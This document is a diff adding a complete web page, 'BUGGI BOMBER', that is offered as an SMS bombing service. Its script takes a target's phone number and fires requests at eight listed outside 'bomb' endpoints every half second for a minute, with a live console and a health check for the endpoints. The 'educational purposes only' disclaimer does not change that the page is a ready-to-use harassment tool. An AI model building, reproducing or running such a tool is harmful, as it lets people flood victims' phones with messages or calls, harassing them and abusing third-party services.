@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BUGGI BOMBER | Premium SMS Service</title>
+    <!-- Modern Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+            background: #0a0a0f;
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Animated Gradient Background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(0, 255, 255, 0.05) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(255, 0, 255, 0.05) 0%, transparent 50%),
+                        radial-gradient(circle at 40% 20%, rgba(255, 255, 0, 0.05) 0%, transparent 50%);
+            animation: gradientShift 15s ease infinite;
+            z-index: -1;
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        /* Floating Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            animation: float 8s infinite;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) scale(0);
+                opacity: 0;
+            }
+            50% {
+                opacity: 0.8;
+            }
+            100% {
+                transform: translateY(-100px) scale(1);
+                opacity: 0;
+            }
+        }
+
+        /* Neon Glow Effects */
+        .neon-text {
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5),
+                         0 0 20px rgba(0, 255, 255, 0.3),
+                         0 0 30px rgba(0, 255, 255, 0.1);
+        }
+
+        .neon-border {
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3),
+                        inset 0 0 20px rgba(0, 255, 255, 0.1);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 40px 0 20px;
+        }
+
+        .logo {
+            font-size: 3.5rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00ffff, #ff00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+            animation: glow 3s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% {
+                filter: drop-shadow(0 0 20px rgba(0, 255, 255, 0.5));
+            }
+            50% {
+                filter: drop-shadow(0 0 40px rgba(255, 0, 255, 0.5));
+            }
+        }
+
+        .tagline {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1.2rem;
+            letter-spacing: 1px;
+        }
+
+        /* Main Card */
+        .main-card {
+            background: rgba(20, 20, 30, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 40px;
+            margin: 30px 0;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.1);
+        }
+
+        /* Input Section */
+        .input-section {
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .input-label {
+            font-size: 1.2rem;
+            color: #00ffff;
+            margin-bottom: 15px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .input-wrapper {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .phone-input {
+            flex: 1;
+            min-width: 250px;
+            padding: 18px 25px;
+            font-size: 1.2rem;
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid rgba(0, 255, 255, 0.3);
+            border-radius: 50px;
+            color: white;
+            font-family: 'Space Grotesk', sans-serif;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.1);
+        }
+
+        .phone-input:focus {
+            outline: none;
+            border-color: #00ffff;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
+        }
+
+        .phone-input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        /* Neon Button */
+        .neon-btn {
+            padding: 18px 35px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            font-family: 'Space Grotesk', sans-serif;
+            background: transparent;
+            color: #00ffff;
+            border: 2px solid #00ffff;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+        }
+
+        .neon-btn:hover {
+            background: #00ffff;
+            color: #0a0a0f;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.5);
+            transform: translateY(-2px);
+        }
+
+        .neon-btn:active {
+            transform: translateY(0);
+        }
+
+        .neon-btn.stop {
+            border-color: #ff00ff;
+            color: #ff00ff;
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.3);
+        }
+
+        .neon-btn.stop:hover {
+            background: #ff00ff;
+            color: #0a0a0f;
+            box-shadow: 0 0 40px rgba(255, 0, 255, 0.5);
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 25px;
+            margin: 40px 0;
+        }
+
+        .stat-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 25px;
+            text-align: center;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            transition: all 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+            border-color: rgba(0, 255, 255, 0.5);
+        }
+
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00ffff, #ff00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* API Status */
+        .api-section {
+            margin: 40px 0;
+        }
+
+        .section-title {
+            font-size: 1.5rem;
+            color: #00ffff;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+
+        .api-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+
+        .api-item {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            transition: all 0.3s;
+        }
+
+        .api-name {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 8px;
+        }
+
+        .api-status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-top: 5px;
+        }
+
+        .status-active {
+            background: rgba(0, 255, 0, 0.2);
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+
+        .status-dead {
+            background: rgba(255, 0, 0, 0.2);
+            color: #ff0000;
+            border: 1px solid #ff0000;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
+        }
+
+        .success-rate {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #00ffff;
+            margin: 5px 0;
+        }
+
+        /* Live Output */
+        .output-section {
+            margin: 40px 0;
+        }
+
+        .output-container {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 20px;
+            padding: 25px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Space Grotesk', monospace;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+        }
+
+        .log-entry {
+            padding: 8px 15px;
+            margin: 5px 0;
+            border-radius: 10px;
+            animation: slideIn 0.3s ease;
+            font-size: 0.95rem;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .log-success {
+            background: rgba(0, 255, 0, 0.1);
+            border-left: 4px solid #00ff00;
+            color: #00ff00;
+        }
+
+        .log-fail {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            color: #ff0000;
+        }
+
+        .log-info {
+            background: rgba(0, 255, 255, 0.1);
+            border-left: 4px solid #00ffff;
+            color: #00ffff;
+        }
+
+        /* Disclaimer */
+        .disclaimer {
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 40px 0;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+
+        .disclaimer h3 {
+            color: #ff4444;
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .disclaimer p {
+            color: rgba(255, 255, 255, 0.8);
+            margin: 8px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .disclaimer p::before {
+            content: '⚠️';
+            position: absolute;
+            left: -5px;
+            top: 0;
+        }
+
+        /* Support Button */
+        .support-section {
+            text-align: center;
+            margin: 40px 0;
+        }
+
+        .support-btn {
+            display: inline-block;
+            padding: 18px 50px;
+            background: linear-gradient(135deg, #00ffff, #ff00ff);
+            color: #0a0a0f;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
+        }
+
+        .support-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px 0;
+            color: rgba(255, 255, 255, 0.5);
+            border-top: 1px solid rgba(0, 255, 255, 0.2);
+            margin-top: 40px;
+        }
+
+        /* Loading Animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #00ffff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .logo {
+                font-size: 2.5rem;
+            }
+            
+            .main-card {
+                padding: 25px;
+            }
+            
+            .input-wrapper {
+                flex-direction: column;
+            }
+            
+            .neon-btn {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1 class="logo">BUGGI BOMBER</h1>
+            <div class="tagline">Premium SMS Bombing Service</div>
+        </div>
+
+        <!-- Main Card -->
+        <div class="main-card">
+            <!-- Input Section -->
+            <div class="input-section">
+                <label class="input-label">📱 Enter Target Number</label>
+                <div class="input-wrapper">
+                    <input type="tel" id="phoneNumber" class="phone-input" 
+                           placeholder="10 digit number (e.g., 9876543210)" 
+                           maxlength="10" pattern="[0-9]{10}">
+                    <button id="startBtn" class="neon-btn">
+                        <span class="btn-text">🚀 START BOMBING</span>
+                    </button>
+                </div>
+                <button id="stopBtn" class="neon-btn stop" style="display: none;">
+                    🛑 STOP BOMBING
+                </button>
+            </div>
+
+            <!-- Stats Grid -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="totalRequests">0</div>
+                    <div class="stat-label">Total Requests</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="successfulReqs">0</div>
+                    <div class="stat-label">Successful</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="failedReqs">0</div>
+                    <div class="stat-label">Failed</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="successRate">0%</div>
+                    <div class="stat-label">Success Rate</div>
+                </div>
+            </div>
+
+            <!-- API Status -->
+            <div class="api-section">
+                <h2 class="section-title">🔧 API NETWORK STATUS</h2>
+                <div class="api-grid" id="apiStatus"></div>
+            </div>
+
+            <!-- Live Output -->
+            <div class="output-section">
+                <h2 class="section-title">📋 LIVE CONSOLE</h2>
+                <div class="output-container" id="output">
+                    <div class="log-entry log-info">⚡ System initialized. Ready to bomb!</div>
+                </div>
+            </div>
+
+            <!-- Disclaimer -->
+            <div class="disclaimer">
+                <h3>⚠️ IMPORTANT DISCLAIMER</h3>
+                <p>This service is for EDUCATIONAL PURPOSES ONLY</p>
+                <p>Only test on your own phone numbers</p>
+                <p>Do not use for harassment or illegal activities</p>
+                <p>We are not responsible for any misuse</p>
+                <p>Respect privacy and terms of service</p>
+                <p>By using this service, you agree to use it responsibly</p>
+            </div>
+
+            <!-- Support -->
+            <div class="support-section">
+                <a href="https://t.me/TRILLIONORE" target="_blank" class="support-btn">
+                    💬 CONTACT SUPPORT
+                </a>
+                <p style="margin-top: 15px; color: rgba(255,255,255,0.5);">@TRILLIONORE</p>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>© 2024 BUGGI BOMBER. All rights reserved.</p>
+            <p>Made with 💙 for educational purposes</p>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const APIS = [
+            "https://secretbomberhai1.vercel.app/bomb?num={phone}",
+            "https://bomber2.vercel.app/bomb?num={phone}",
+            "https://buggipapa-delta.vercel.app/bomb?num={phone}",
+            "https://buggipapa4.vercel.app/bomb?num={phone}",
+            "https://buggipapa5.vercel.app/bomb?num={phone}",
+            "https://bomber6.vercel.app/bomb?num={phone}",
+            "https://testapis1.vercel.app/bomb?num={phone}",
+            "https://bomber7isforcall.vercel.app/bomb?num={phone}"
+        ];
+
+        const CALL_INTERVAL = 500; // 0.5 seconds
+        const MAX_DURATION_MINUTES = 1;
+
+        // State
+        let isBombing = false;
+        let phoneNumber = '';
+        let stats = {
+            total: 0,
+            successful: 0,
+            failed: 0,
+            startTime: null,
+            endTime: null
+        };
+        let apiStats = APIS.map(url => ({
+            url,
+            uses: 0,
+            success: 0,
+            fail: 0,
+            lastUsed: null,
+            lastRespMs: null,
+            status: 'checking'
+        }));
+
+        // DOM Elements
+        const phoneInput = document.getElementById('phoneNumber');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const output = document.getElementById('output');
+        const totalRequestsEl = document.getElementById('totalRequests');
+        const successfulReqsEl = document.getElementById('successfulReqs');
+        const failedReqsEl = document.getElementById('failedReqs');
+        const successRateEl = document.getElementById('successRate');
+        const apiStatusEl = document.getElementById('apiStatus');
+
+        // Create particles
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 8 + 's';
+                particle.style.width = Math.random() * 4 + 1 + 'px';
+                particle.style.height = particle.style.width;
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        // Add log
+        function addLog(message, type = 'info') {
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            output.appendChild(logEntry);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        // Update stats
+        function updateStats() {
+            totalRequestsEl.textContent = stats.total;
+            successfulReqsEl.textContent = stats.successful;
+            failedReqsEl.textContent = stats.failed;
+            const rate = stats.total > 0 ? ((stats.successful / stats.total) * 100).toFixed(1) : 0;
+            successRateEl.textContent = rate + '%';
+        }
+
+        // Update API status
+        function updateApiStatus() {
+            apiStatusEl.innerHTML = '';
+            apiStats.forEach((api, index) => {
+                const successRate = api.uses > 0 ? ((api.success / api.uses) * 100).toFixed(0) : 100;
+                const statusClass = api.status === 'active' ? 'status-active' : 'status-dead';
+                const statusText = api.status === 'active' ? '● ACTIVE' : '○ DEAD';
+                
+                const apiItem = document.createElement('div');
+                apiItem.className = 'api-item';
+                apiItem.innerHTML = `
+                    <div class="api-name">API ${index + 1}</div>
+                    <div class="success-rate">${successRate}%</div>
+                    <div class="api-status-badge ${statusClass}">${statusText}</div>
+                    <div style="font-size: 0.8rem; margin-top: 8px; color: rgba(255,255,255,0.5);">
+                        ${api.uses} calls
+                    </div>
+                `;
+                apiStatusEl.appendChild(apiItem);
+            });
+        }
+
+        // Make request
+        async function makeRequest(apiUrl) {
+            const url = apiUrl.replace('{phone}', phoneNumber);
+            const start = Date.now();
+            
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 8000);
+                
+                const response = await fetch(url, {
+                    signal: controller.signal,
+                    mode: 'no-cors'
+                });
+                
+                clearTimeout(timeoutId);
+                const elapsed = Date.now() - start;
+                
+                return {
+                    ok: true,
+                    elapsedMs: elapsed
+                };
+            } catch (error) {
+                const elapsed = Date.now() - start;
+                return {
+                    ok: false,
+                    error: error.message,
+                    elapsedMs: elapsed
+                };
+            }
+        }
+
+        // Get random API
+        function getRandomApi() {
+            return apiStats[Math.floor(Math.random() * apiStats.length)];
+        }
+
+        // Record API result
+        function recordApiResult(api, success, elapsedMs) {
+            api.uses++;
+            if (success) {
+                api.success++;
+            } else {
+                api.fail++;
+            }
+            api.lastUsed = new Date().toLocaleTimeString();
+            api.lastRespMs = elapsedMs;
+            updateApiStatus();
+        }
+
+        // Bombing loop
+        async function startBombing() {
+            if (!isBombing) return;
+
+            const currentTime = new Date();
+            if (currentTime >= stats.endTime) {
+                stopBombing();
+                addLog('✅ Bombing session completed!', 'success');
+                return;
+            }
+
+            const api = getRandomApi();
+            const apiIndex = apiStats.indexOf(api) + 1;
+            
+            addLog(`🚀 Sending to API ${apiIndex}...`, 'info');
+            const result = await makeRequest(api.url);
+            
+            stats.total++;
+            
+            if (result.ok) {
+                stats.successful++;
+                addLog(`✅ API ${apiIndex} success (${result.elapsedMs}ms)`, 'success');
+                recordApiResult(api, true, result.elapsedMs);
+            } else {
+                stats.failed++;
+                addLog(`❌ API ${apiIndex} failed (${result.elapsedMs}ms)`, 'fail');
+                recordApiResult(api, false, result.elapsedMs);
+            }
+            
+            updateStats();
+            
+            const elapsedSeconds = Math.floor((currentTime - stats.startTime) / 1000);
+            const totalSeconds = MAX_DURATION_MINUTES * 60;
+            const remainingSeconds = totalSeconds - elapsedSeconds;
+            const progress = ((elapsedSeconds / totalSeconds) * 100).toFixed(1);
+            
+            addLog(`📊 Progress: ${progress}% | Time left: ${remainingSeconds}s`, 'info');
+            
+            if (isBombing) {
+                setTimeout(startBombing, CALL_INTERVAL);
+            }
+        }
+
+        // Start handler
+        function handleStart() {
+            const num = phoneInput.value.trim();
+            
+            if (!num || !/^\d{10}$/.test(num)) {
+                addLog('❌ Please enter a valid 10-digit number!', 'fail');
+                return;
+            }
+            
+            phoneNumber = num;
+            
+            stats = {
+                total: 0,
+                successful: 0,
+                failed: 0,
+                startTime: new Date(),
+                endTime: new Date(Date.now() + MAX_DURATION_MINUTES * 60 * 1000)
+            };
+            
+            isBombing = true;
+            startBtn.style.display = 'none';
+            stopBtn.style.display = 'inline-block';
+            phoneInput.disabled = true;
+            
+            output.innerHTML = '';
+            addLog(`💣 BOMBING STARTED on ${phoneNumber}`, 'success');
+            addLog(`⏰ Duration: ${MAX_DURATION_MINUTES} minute`, 'info');
+            addLog(`⚡ Interval: ${CALL_INTERVAL/1000}s | APIs: ${APIS.length}`, 'info');
+            
+            startBombing();
+        }
+
+        // Stop handler
+        function stopBombing() {
+            isBombing = false;
+            
+            startBtn.style.display = 'inline-block';
+            stopBtn.style.display = 'none';
+            phoneInput.disabled = false;
+            
+            const duration = stats.startTime ? 
+                Math.floor((Date.now() - stats.startTime) / 1000) : 0;
+            const successRate = stats.total > 0 ? 
+                ((stats.successful / stats.total) * 100).toFixed(1) : 0;
+            
+            addLog('🛑 BOMBING STOPPED', 'fail');
+            addLog(`📊 Final: ${stats.total} total | ${stats.successful} success | ${stats.failed} failed | ${successRate}% rate`, 'info');
+            addLog(`⏱️ Duration: ${duration}s`, 'info');
+        }
+
+        // Check API health
+        async function checkApiHealth() {
+            for (let i = 0; i < apiStats.length; i++) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 3000);
+                    
+                    const testUrl = apiStats[i].url.replace('{phone}', '0000000000');
+                    await fetch(testUrl, { 
+                        signal: controller.signal,
+                        mode: 'no-cors'
+                    });
+                    
+                    clearTimeout(timeoutId);
+                    apiStats[i].status = 'active';
+                } catch (error) {
+                    apiStats[i].status = 'dead';
+                }
+            }
+            updateApiStatus();
+        }
+
+        // Event listeners
+        startBtn.addEventListener('click', handleStart);
+        stopBtn.addEventListener('click', stopBombing);
+
+        phoneInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+        });
+
+        // Initialize
+        createParticles();
+        updateApiStatus();
+        addLog('⚡ System ready. Enter number and start bombing!', 'info');
+        
+        checkApiHealth();
+        setInterval(checkApiHealth, 30000); // Check every 30 seconds
+    </script>
+</body>
+</html>
